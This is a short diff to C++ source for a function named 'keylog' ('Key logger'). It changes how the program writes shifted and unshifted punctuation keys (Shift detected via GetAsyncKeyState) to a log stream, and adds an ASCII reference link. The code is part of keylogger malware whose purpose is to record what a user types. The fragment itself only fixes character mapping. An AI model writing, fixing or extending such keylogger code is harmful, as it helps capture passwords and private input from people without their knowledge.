@@ -183,43 +183,43 @@ void keylog(void) //Key logger
                 }
                 else
                 {
-
+                    //https://en.cppreference.com/w/cpp/language/ascii
                     switch (c)
                     {
                     case 43:
                     {
                         if (GetAsyncKeyState(0x10))
 
-                            write << "+";
-                        else
                             write << "*";
+                        else
+                            write << "+";
                     }
                     break;
                     case 44:
                     {
                         if (GetAsyncKeyState(0x10))
 
-                            write << ",";
-                        else
                             write << ";";
+                        else
+                            write << ",";
                     }
                     break;
                     case 45:
                     {
                         if (GetAsyncKeyState(0x10))
 
-                            write << "-";
-                        else
                             write << "_";
+                        else
+                            write << "-";
                     }
                     break;
                     case 46:
                     {
                         if (GetAsyncKeyState(0x10))
 
-                            write << ".";
-                        else
                             write << ":";
+                        else
+                            write << ".";
                     }
                     break;
                     case 48:
